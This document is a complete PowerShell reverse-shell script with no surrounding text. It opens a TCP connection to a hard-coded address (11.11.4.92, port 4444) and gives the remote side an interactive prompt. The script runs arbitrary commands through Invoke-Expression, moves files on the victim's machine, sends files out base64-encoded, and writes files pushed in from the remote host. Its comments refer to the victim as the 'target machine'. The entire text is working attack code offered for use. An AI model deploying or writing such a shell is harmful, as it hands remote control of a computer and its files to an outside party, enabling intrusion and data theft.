$client = New-Object System.Net.Sockets.TCPClient('11.11.4.92', 4444)
$stream = $client.GetStream()
$writer = New-Object System.IO.StreamWriter($stream)
$reader = New-Object System.IO.StreamReader($stream)

# Store initial directory separately without modifying the actual system
$global:currentDir = "C:\Users\Lenovo"

while ($client.Connected) {
    $writer.Write('PS ' + $global:currentDir + '> ')
    $writer.Flush()
    $cmd = $reader.ReadLine()

    if ($cmd -match '^cd\s+(.+)$') {
        # Simulate changing directories without affecting the target machine
        $newDir = $matches[1].Trim()
        $fullPath = if ([System.IO.Path]::IsPathRooted($newDir)) { $newDir } else { Join-Path $global:currentDir $newDir }

        if (Test-Path $fullPath -PathType Container) {
            $global:currentDir = (Resolve-Path -Path $fullPath).Path
        } else {
            $writer.WriteLine("Error: Directory not found - $fullPath")
        }
        $writer.Flush()
        continue
    }

    elseif ($cmd -match "^mv\s+(.+)\s+(.+)$") {
        # Handle move operation with absolute and relative paths
        $source = $matches[1].Trim('"')
        $destination = $matches[2].Trim('"')

        if (-not (Test-Path $source)) { $source = Join-Path $global:currentDir $source }
        if (-not ($destination -match "^[a-zA-Z]:\\")) { $destination = Join-Path $global:currentDir $destination }

        if (Test-Path $source) {
            Move-Item -Path $source -Destination $destination -Force
            $writer.WriteLine("Moved: $source → $destination")
        } else {
            $writer.WriteLine("Error: Source file not found - $source")
        }
        $writer.Flush()
        continue
    }

    elseif ($cmd -eq "ls") {
        # List directory contents without changing the working directory
        $items = Get-ChildItem -Path $global:currentDir | ForEach-Object {
            "$($_.Name)  $( [math]::Round($_.Length / 1KB, 2) ) KB  $($_.LastWriteTime)"
        }
        $writer.WriteLine($items -join "`n")
        $writer.Flush()
        continue
    }

    elseif ($cmd -eq 'exit') {
        break
    }

    # Download files (Base64 encoding)
    elseif ($cmd -match "^download\s+(.+)$") {
        $file = $matches[1].Trim('"')
        if (-not (Test-Path $file)) { $file = Join-Path $global:currentDir $file }
        
        if (Test-Path $file) {
            $bytes = [System.IO.File]::ReadAllBytes($file)
            $base64 = [Convert]::ToBase64String($bytes)
            $writer.WriteLine("FILE_TRANSFER_START " + $base64 + " FILE_TRANSFER_END")
        } else {
            $writer.WriteLine("Error: File not found - $file")
        }
        $writer.Flush()
        continue
    }

     # Upload files (Base64 decoding)
    elseif ($cmd -match "^upload\s+(.+)\s+(.+)$") {
        $filename = $matches[1].Trim('"')
        $base64data = $matches[2]

        $fullPath = Join-Path $global:currentDir $filename
        $bytes = [Convert]::FromBase64String($base64data)
        [System.IO.File]::WriteAllBytes($fullPath, $bytes)

        $writer.WriteLine("File uploaded successfully to $fullPath")
        $writer.Flush()
        continue
    }

    else {
        $output = Invoke-Expression -Command $cmd 2>&1 | Out-String
        $writer.WriteLine($output)
        $writer.Flush()
    }
}
 
$writer.Close()
$reader.Close()
$client.Close()
